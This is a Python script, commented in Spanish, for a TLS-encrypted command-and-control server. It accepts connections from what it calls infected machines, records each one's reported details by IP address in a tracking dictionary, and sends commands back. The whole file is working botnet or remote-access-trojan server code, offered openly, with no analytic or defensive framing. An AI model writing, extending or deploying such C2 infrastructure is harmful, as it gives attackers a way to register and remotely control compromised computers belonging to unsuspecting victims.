import socket
import threading
import json
import ssl

# Configuración del servidor
HOST = '0.0.0.0'  # Escucha en todas las interfaces de red
PORT = 12345
CERTFILE = 'cert.pem'
KEYFILE = 'key.pem'

# Datos de las máquinas infectadas
infected_machines = {}

def handle_client(client_socket):
    try:
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            message = data.decode('utf-8')
            print(f"Received: {message}")
            try:
                # Procesa el mensaje recibido
                info = json.loads(message)
                infected_machines[info['IP Address']] = info
                # Envía una respuesta al cliente
                response = {"status": "success", "command": "echo 'Connected to C2'"}
                client_socket.sendall(json.dumps(response).encode('utf-8'))
            except json.JSONDecodeError as e:
                print(f"Error decoding JSON: {e}")
    except Exception as e:
        print(f"Error handling client: {e}")
    finally:
        client_socket.close()

def start_server():
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=CERTFILE, keyfile=KEYFILE)

    with socket.socket(socket.AF_INET) as server_socket:
        server_socket.bind((HOST, PORT))
        server_socket.listen(5)
        print(f"Servidor C2 escuchando en {HOST}:{PORT}")

        while True:
            client_socket, addr = server_socket.accept()
            print(f"Conexión desde {addr}")
            client_socket = context.wrap_socket(client_socket, server_side=True)
            client_handler = threading.Thread(target=handle_client, args=(client_socket,))
            client_handler.start()

if __name__ == "__main__":
    start_server()
